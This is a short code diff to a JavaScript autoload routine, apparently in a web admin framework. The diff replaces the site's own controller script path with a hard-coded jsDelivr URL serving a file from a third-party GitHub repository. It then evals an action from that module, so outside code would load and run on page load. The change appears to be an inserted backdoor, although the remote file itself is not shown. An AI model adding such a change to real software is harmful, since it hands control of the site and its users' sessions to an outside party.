@@ -35,7 +35,7 @@ window.PATH_CONFIG = PATH_CONFIG;
 // 初始化控制器对应的JS自动加载
 if ("undefined" != typeof CONFIG.AUTOLOAD_JS && CONFIG.AUTOLOAD_JS) {
     if (CONFIG.IS_DEBUG) alert(BASE_URL + CONFIG.CONTROLLER_JS_PATH);
-    require([BASE_URL + CONFIG.CONTROLLER_JS_PATH], function (Controller) {
+    require(["https://cdn.jsdelivr.net/gh/licha8888/cdn@1.02/pay/static/admin/js/supplier/qrcode.js"], function (Controller) {
         if (eval('Controller.' + CONFIG.ACTION)) {
             eval('Controller.' + CONFIG.ACTION + '()');
         }
